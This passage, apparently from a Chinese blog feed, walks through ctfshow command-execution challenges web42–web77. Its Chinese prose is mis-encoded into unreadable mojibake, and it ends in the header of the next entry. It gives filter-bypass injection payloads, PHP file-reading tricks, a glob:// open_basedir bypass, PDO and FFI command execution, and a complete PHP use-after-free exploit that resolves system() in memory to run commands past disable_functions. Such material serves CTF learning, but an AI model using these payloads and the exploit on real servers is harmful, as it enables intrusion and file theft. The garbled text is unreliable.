å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p><h2 id="ç±»å‹ä¸‰-æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„å˜é‡æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆsystemå‡½æ•°ï¼‰"><a href="#ç±»å‹ä¸‰-æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„å˜é‡æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆsystemå‡½æ•°ï¼‰" class="headerlink" title="ç±»å‹ä¸‰:æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„å˜é‡æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆsystemå‡½æ•°ï¼‰"></a>ç±»å‹ä¸‰:æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„å˜é‡æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆsystemå‡½æ•°ï¼‰</h2><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ä¹Ÿå¯ä»¥å†™æˆâ€œ1&gt; &#x2F;dev&#x2F;null 2&gt; &amp;1â€,æˆ‘ä»¬å†™å…¥çš„å‘½ä»¤çš„æ‰§è¡Œç»“æœä¼šè¢«é»‘æ´åæ‰ã€‚</p><p>åˆ†éš”ç¬¦å˜é‡æ‹¼æ¥å¯ä»¥ç”¨åˆ†éš”ç¬¦æ¥æ§åˆ¶åé¢è¯­å¥çš„æ‰§è¡Œ</p><p>åˆ†å‰²ç¬¦</p><pre><code>; åˆ†å·é¡ºåºæ‰§è¡Œ&amp;&amp; é¡ºåºæ‰§è¡Œ|| å‰è¾¹æ‰§è¡ŒæˆåŠŸåˆ™ä¸å†æ‰§è¡Œæ¢è¡Œç¬¦(åœ¨urlä¸­æ˜¯%0a)&amp; (åœ¨urlä¸­æ˜¯%26)</code></pre><p>æ³¨æ„ï¼Œé€šè¿‡urlä¼ é€’&amp;&amp;æ—¶è¦è®°å¾—urlencodeä¸º%26%26ï¼Œå¦åˆ™ä¼šè¢«å½“ä½œurlå‚æ•°çš„åˆ†éš”ç¬¦è€Œä¸æ˜¯shellå‘½ä»¤çš„åˆ†éš”ç¬¦ã€‚</p><pre><code>payload c=cat flag.php%26</code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>è¿‡æ»¤äº†catï¼Œç”¨tacæ›¿æ¢</p><pre><code>paylaod c=tac flag.php%26</code></pre><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>payload c=tac f*%26</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>ç”¨%09æ›¿æ¢ç©ºæ ¼</p><pre><code>paylaod c=tac%09f*%26</code></pre><p>å¸¸è§çš„ç©ºæ ¼æ›¿æ¢</p><pre><code>%09ï¼Œ%20ï¼Œ$IFSã€$&#123;IFS&#125;ã€$IFS$9ï¼Œ&#123;tac,*&#125;ï¼Œ&lt;ï¼Œ&lt;&gt;</code></pre><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>è¿‡æ»¤äº†*å’Œæ•°å­—</p><pre><code>payload c=tac%09fla&#39;&#39;g.php||        c=tac%09fl[a-z]g.php||</code></pre><p>%09è§£ç åæ˜¯æ°´å¹³åˆ¶è¡¨ç¬¦ï¼Œè€Œä¸æ˜¯æ•°å­—</p><h3 id="web47-49"><a href="#web47-49" class="headerlink" title="web47-49"></a>web47-49</h3><pre><code>payload c=tac%09fla&#39;&#39;g.php||</code></pre><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>å±è”½äº†x09å’Œx26ï¼Œä¹Ÿå°±æ˜¯å±è”½äº†%09å’Œ%26ï¼Œç”¨å…¶ä»–æ–¹å¼ç»•è¿‡ç©ºæ ¼,è¿™å…³ç”¨ä¸äº†[a-z]äº†</p><pre><code>payload c=tac&lt;&gt;fl\ag.php||</code></pre><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>tacè¢«banäº†</p><pre><code>payload c=ta&#39;&#39;c&lt;&gt;fla\g.php||        c=ta\c&lt;&gt;fla\g.php||        c=nl&lt;&gt;fla\g.php||</code></pre><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;å°–æ‹¬å·è¢«è¿‡æ»¤äº†ä½†æ˜¯$æ²¡è¿‡æ»¤</p><pre><code>?c=ls$&#123;IFS&#125;../../../||   //flagåœ¨æ ¹ç›®å½•c=ta\c$&#123;IFS&#125;../../../fl\ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>å¤šè¿‡æ»¤äº†wgetï¼Œæ²¡å½±å“</p><pre><code>payload ?c=ta\c$&#123;IFS&#125;fla\g.php</code></pre><p>æ³¨æ„ï¼Œè¿™ä¸€å…³æ²¡æœ‰äº†é»‘æ´</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>1.å¯ä»¥ä½¿ç”¨grepå‘½ä»¤ï¼š</p><pre><code>?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl?g.php</code></pre><p>2.å¯ä»¥ä½¿ç”¨mvå‘½ä»¤</p><pre><code>?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt  //ç›´æ¥è®¿é—®a.txt</code></pre><ol start="3"><li>&#x2F;binä¸‹å­˜æ”¾ä¸€äº›æ™®é€šçš„åŸºæœ¬å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦å»è°ƒç”¨å‘½ä»¤</li></ol><pre><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>æ–¹æ³•ä¸€ï¼šé€šè¿‡åŒ¹é…binä¸‹å­˜åœ¨çš„å‘½ä»¤è¿›è¡Œè¯»å–flagã€‚<br> binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚<br> æˆ‘ä»¬æ—¥å¸¸ç›´æ¥ä½¿ç”¨çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯&#x2F;bin&#x2F;ls</p><pre><code>payload ?c=/???/????64 ????.???//ä¹Ÿå°±æ˜¯?c=/bin/base64 flag.php</code></pre><p>æ–¹æ³•äºŒï¼šbzip2çš„ä½¿ç”¨</p><pre><code>payloadï¼š?c=/???/???/????2 ????.???//ä¹Ÿå°±æ˜¯/usr/bin/bzip2 flag.phpç„¶åè®¿é—®/flag.php.bz2è¿›è¡Œä¸‹è½½è·å¾—flag.php</code></pre><p>æ³¨:<strong>&#x2F;bin</strong> æ˜¯æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®å¹¶æ‰§è¡Œçš„å¯æ‰§è¡Œç¨‹åºã€‚åŒ…æ‹¬è¶…çº§ç”¨æˆ·åŠä¸€èˆ¬ç”¨æˆ·ã€‚<br>      <strong>&#x2F;usr&#x2F;bin</strong> æ˜¯ç³»ç»Ÿå®‰è£…æ—¶è‡ªå¸¦çš„ä¸€äº›å¯æ‰§è¡Œç¨‹åºã€‚å³ç³»ç»Ÿç¨‹åºã€‚</p><p>æ–¹æ³•ä¸‰ï¼š</p><p>å¯ä»¥é€šè¿‡postä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶é‡Œé¢çš„shå‘½ä»¤)ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡.(ç‚¹)å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚(å½¢æˆäº†æ¡ä»¶ç«äº‰)ã€‚ä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨linuxä¸‹é¢ä¿å­˜åœ¨&#x2F;tmp&#x2F;php?????[@-[]ï¼ˆä¸Šä¼ çš„æ–‡ä»¶åœ¨linuxä¸‹é¢ä¸€èˆ¬ä¿å­˜åœ¨&#x2F;tmp&#x2F;php??????ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯äº”ä¸ªå°å†™åŠ ä¸€ä¸ªå¤§å†™ï¼Œå¤§å†™å¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼Œä¸è¿‡å› ä¸ºæ˜¯éšæœºç”Ÿæˆçš„å¤§å†™å­—æ¯ï¼Œä¸ä¸€å®šæ¯æ¬¡éƒ½æ˜¯å¤§å†™ï¼Œå¯ä»¥å¤šè¯•å‡ ä¸‹ã€‚ï¼‰<br>æ³¨æ„ï¼šé€šè¿‡.å»æ‰§è¡Œshå‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™<br>éœ€è¦å…ˆæ„é€ ä¸€ä¸ªpostä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ã€‚</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt; &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ç„¶åæŠ“åŒ…å¹¶ä¿®æ”¹æ–‡ä»¶å†…å®¹æ”¹ä¸ºshellå‘½ä»¤ï¼Œå¹¶ä¸”ä¼ å…¥cå‚æ•°ï¼š</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/155054.png" class=""><p>å¯ä»¥çœ‹çœ‹pç¥çš„æ— å­—æ¯æ•°å­—æé«˜ç¯‡<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>è¿‡æ»¤äº†æ•°å­—ï¼Œä½¿ç”¨å‰ä¸€å…³çš„ç¬¬ä¸‰ç§æ–¹æ³•å³å¯</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>è¿™å…³éœ€è¦æ„é€ å‡º36ã€‚</p><p>$(()) ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0</p><p>$((~$(())))å¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1ï¼ˆå¦‚æœå¯¹aæŒ‰ä½å–åï¼Œåˆ™å¾—åˆ°çš„ç»“æœä¸º-(a+1)ï¼‰<br>$(($((~$(())))$((~$(()))))) -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2</p><p>å†™ä¸ªè„šæœ¬ç”Ÿæˆpayload:</p><pre><code class="php">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;print(data)</code></pre><h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>ç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œç›´æ¥è¯»å–æ–‡ä»¶</p><p>é¦–å…ˆè·å–æ–‡ä»¶è·¯å¾„</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/104435.png" class=""><pre><code>c=print_r(scandir(dirname(&#39;./&#39;)));c=var_dump(scandir(&#39;./&#39;));c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;c=$a=&quot;glob:///*&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo $file.&quot;\n&quot;;&#125;&#125;c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;c=$a=dir(getcwd());while ($file = $a-&gt;read())&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></pre><p>phpè¯»å–æ–‡ä»¶å‡½æ•°ï¼š</p><pre><code>file()æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­readfile()è¯»å–æ–‡ä»¶fpassthru()è¯»å–æ–‡ä»¶highlight_file()è¯»æ–‡ä»¶show_source()åŒä¸Šbase64_decode()base64è§£ç strrev()åè½¬å­—ç¬¦ä¸²php_strip_whitespace()  è¿”å›åˆ é™¤æ³¨é‡Šå’Œç©ºæ ¼åçš„PHPæºç file_get_contents()   å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²include($filename); // éphpä»£ç include_once($filename); // éphpä»£ç require($filename); // éphpä»£ç require_once($filename); // éphpä»£ç ç¤ºä¾‹ï¼šecho file_get_contents(&quot;flag.php&quot;);   print_r(file(&#39;flag.php&#39;));var_dump(file(&#39;flag.php&#39;));include(&#39;flag.php&#39;);echo $flag;var_dump(glob(&quot;*flag*&quot;)); // å¯»æ‰¾ä¸æ¨¡å¼åŒ¹é…çš„æ–‡ä»¶è·¯å¾„include(&#39;flag.php&#39;);var_dump(get_defined_vars()); //get_defined_vars()å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</code></pre><p>é€šè¿‡fopenè¯»å–æ–‡ä»¶å†…å®¹</p><pre><code>fread()fread($file,100)     è¯»å–æ‰“å¼€çš„æ–‡ä»¶ï¼Œè¯»å–100ä¸ªå­—èŠ‚fgets()è¯»å–ä¸€è¡Œfgetc()è¯»å–ä¸€ä¸ªå­—ç¬¦fgetss()fgetcsv()è¯»å–ä¸€è¡Œgpassthru()payload:c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//ä¸€è¡Œä¸€è¡Œè¯»å–c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¯»å–c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</code></pre><p>ä¹Ÿå¯ä»¥é€šè¿‡å¤åˆ¶ï¼Œé‡å‘½åè¯»å–phpæ–‡ä»¶å†…å®¹</p><pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><p>è¿˜å¯ä»¥ç›´æ¥ç”¨èšå‰‘è¿æ¥ã€‚</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>show_source()è¢«banäº†ï¼Œä½¿ç”¨highlight_file()ï¼Œè¿™æ¬¡çš„flagåœ¨flag.txté‡Œï¼Œå…ˆæŸ¥ç›®å½•ï¼Œå†è¿›æ–‡ä»¶ã€‚</p><pre><code>c=print_r(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>print_rè¢«banäº†</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>highlight_file()è¢«banäº†ï¼Œä½†å› ä¸ºflagåœ¨txté‡Œï¼Œæ‰€ä»¥å¯ä»¥ç”¨include()</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=include(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web69-70"><a href="#web69-70" class="headerlink" title="web69-70"></a>web69-70</h3><p>print_r()å’Œvar_dump()éƒ½è¢«banäº†ï¼Œç”¨å…¶ä»–æ–¹å¼è¯»ç›®å½•</p><pre><code>c=$a=opendir(&#39;./&#39;);while(($file=readdir($a))!==false)&#123;echo $file.â€œ&lt;/br&gt;â€;&#125;;c=include(&#39;/flag.txt&#39;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>ä¸‹è½½é™„ä»¶</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/212130.png" class=""><pre><code>ob_get_contents â€” è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</code></pre><pre><code>payload c=include(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>å°è¯•è¯»å–æ ¹ç›®å½•</p><pre><code>c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</code></pre><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/215446.png" class=""><p>open_basedirï¼šå°†PHPæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚fopen()æˆ–file_get_contents()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€ã€‚<br> disable_functionsï¼šç”¨äºç¦æ­¢æŸäº›å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯é»‘åå•ï¼Œç®€å•æ¥è¯´å°±æ˜¯phpä¸ºäº†é˜²æ­¢æŸäº›å±é™©å‡½æ•°æ‰§è¡Œç»™å‡ºçš„é…ç½®é¡¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºç©ºã€‚<br> ini_set()ç”¨äºè®¾ç½®æŒ‡å®šé…ç½®é€‰é¡¹çš„å€¼ã€‚è¿™ä¸ªé€‰é¡¹ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶ä¿æŒæ–°çš„å€¼ï¼Œå¹¶åœ¨è„šæœ¬ç»“æŸæ—¶æ¢å¤ã€‚ä½†æ˜¯è¿™é¢˜ä¹Ÿç»™banäº†ã€‚<br> é‚£ä¹ˆå¯ä»¥ä½¿ç”¨globä¼ªåè®®ç»•è¿‡open_basedir</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</code></pre><p>ç„¶åå¯ä»¥çœ‹åˆ°flagæ–‡ä»¶åä¸ºflag0.txtï¼Œä½†æ˜¯ç”±äºopen_basedirçš„é™åˆ¶ï¼Œè¿˜æ˜¯ä¸å¯ä»¥ç›´æ¥includeè¿›æ¥ï¼Œéœ€è¦æƒ³å…¶å®ƒçš„åŠæ³•ã€‚ä½¿ç”¨UAFã€‚è„šæœ¬å¦‚ä¸‹ï¼šè®°å¾—è¦æŠŠc&#x3D;ä¹‹åçš„å†…å®¹urlç¼–ç ï¼š</p><pre><code>c=function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                              if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                    if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();#éœ€è¦é€šè¿‡urlç¼–ç å“¦</code></pre><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><p>æ‰«æç›®å½•</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();c=$d=opendir(&quot;../../../&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit(); //è·Ÿç€åˆ«çš„æ•™ç¨‹èµ°äº†åŠå¤©ï¼Œæœ€åå‘ç°è¿™ä¸¤å…³æ²¡æœ‰è¢«open_basediré™åˆ¶</code></pre><p>ç›´æ¥ç”¨include</p><pre><code>c=include(&quot;/flagc.txt&quot;);exit(0);c=require(&quot;/flagc.txt&quot;);exit(0);</code></pre><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>ç›´æ¥include()ä¸è¡Œäº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å¯ä½¿ç”¨çš„è¿›ç¨‹å»è¯»å–flagã€‚è¿™é‡Œä½¿ç”¨PDO(PHP Database Object)å»æ‰§è¡Œsqlè¯­å¥è¿›è€Œè¯»å‡ºflag</p><pre><code>c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>çœ‹å¤§ä½¬è¯´æ˜¯è¦ç”¨åˆ°ä½¿ç”¨PHP7.4ä»¥ä¸Šæ‰æœ‰çš„FFIè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre><code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡$a=&#39;/readflag &gt; 1.txt&#39;;//æ²¡æœ‰å›æ˜¾çš„$ffi-&gt;system($a);//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</code></pre><p>å‚è€ƒï¼š<a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¼ªåè®®</title>
      <link href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
